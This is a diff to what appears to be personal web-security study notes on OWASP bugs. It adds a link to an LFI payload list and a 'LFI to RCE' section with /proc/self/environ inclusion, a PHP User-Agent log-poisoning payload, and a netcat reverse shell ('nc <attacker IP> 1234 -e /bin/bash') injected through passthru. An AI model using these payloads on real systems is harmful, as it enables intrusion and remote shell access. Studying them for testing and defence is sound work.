@@ -1444,7 +1444,7 @@ OR:
 • Cryptography - study of encryption principles/methods</rich_text>
     </node>
   </node>
-  <node name="Bugs (EXPLAINATION) OWASP10" unique_id="14" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1621941520" ts_lastsave="1624205438">
+  <node name="Bugs (EXPLAINATION) OWASP10" unique_id="14" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1621941520" ts_lastsave="1624208784">
     <rich_text link="webs https://owasp.org/www-project-top-ten/">https://owasp.org/www-project-top-ten/</rich_text>
     <rich_text>
 ==============================================================
@@ -1979,7 +1979,7 @@ XMLHttpRequest.send()</rich_text>
 
 </rich_text>
     </node>
-    <node name="Local File Inclusion (LFI)" unique_id="67" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1624205438" ts_lastsave="1624208007">
+    <node name="Local File Inclusion (LFI)" unique_id="67" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1624205438" ts_lastsave="1624208263">
       <rich_text>→ </rich_text>
       <rich_text weight="heavy">Local file inclusion</rich_text>
       <rich_text> (also known as </rich_text>
@@ -2001,6 +2001,10 @@ XMLHttpRequest.send()</rich_text>
 → Dont forget to go back directories, with </rich_text>
       <rich_text foreground="#0000ffff0000">../</rich_text>
       <rich_text>  
+
+→ Payload : </rich_text>
+      <rich_text link="webs https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt">https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt</rich_text>
+      <rich_text>
 -----------------------------------------------------------------------------------------------------------------------------------
 </rich_text>
       <rich_text background="#ffff00000000">#Impact of LFI :</rich_text>
@@ -2036,6 +2040,8 @@ Always check source of with the keywords with :
 →  </rich_text>
       <rich_text foreground="#0000ffff0000">php://filter/convert.base64-encode/resource=home.php</rich_text>
       <rich_text> after getting code decode the code into plain text
+
+
 ----------------------------------------------------------------------------------------------------------------------------------
 </rich_text>
       <rich_text background="#ffff00000000"># Possible parameter: </rich_text>
@@ -2068,6 +2074,38 @@ Always check source of with the keywords with :
 ?conf={payload}</rich_text>
       <rich_text>
 </rich_text>
+    </node>
+    <node name="LFI to RCE" unique_id="68" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1624208784" ts_lastsave="1624210092">
+      <rich_text>→ If LFI exists then there is a high chance of RCE in the website. 
+-----------------------------------------------------------------------------------------------------------------------------------
+</rich_text>
+      <rich_text background="#ffff00000000">1. LFI to RCE : environment</rich_text>
+      <rich_text>
+ Try : google.com/index.php/page</rich_text>
+      <rich_text foreground="#0000ffff0000">=/proc/self/environ</rich_text>
+      <rich_text>  #If you imply this payload you can get RCE vuln.
+
+</rich_text>
+      <rich_text background="#ffff00000000">2. LFI to RCE : php information:</rich_text>
+      <rich_text> 
+If the server is made in php try to execute this payload in the </rich_text>
+      <rich_text background="#ffff00000000">User Agent from the brupsuit</rich_text>
+      <rich_text> : 
+</rich_text>
+      <rich_text foreground="#0000ffff0000">User-Agent : &lt;? php phpinfo(); ?&gt;</rich_text>
+      <rich_text> #This also states that RCE is possible 
+
+</rich_text>
+      <rich_text background="#ffff00000000">3. LFI to RCE : Netcat uitlity: </rich_text>
+      <rich_text> 
+</rich_text>
+      <rich_text foreground="#0000ffff0000">root@sumedh:-# nc -lvp 1234</rich_text>
+      <rich_text> #If you are exploiting in local environment, then no port-forwarding is needed.
+</rich_text>
+      <rich_text foreground="#0000ffff0000">User-Agent : &lt;?php passthru("nc*IP address of the attacker* 1234 -e /bin/bash ")</rich_text>
+      <rich_text> </rich_text>
+      <rich_text foreground="#0000ffff0000">?&gt;</rich_text>
+      <rich_text> and send.</rich_text>
     </node>
   </node>
   <node name="2FA bypass" unique_id="63" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1624168775" ts_lastsave="1624170083">
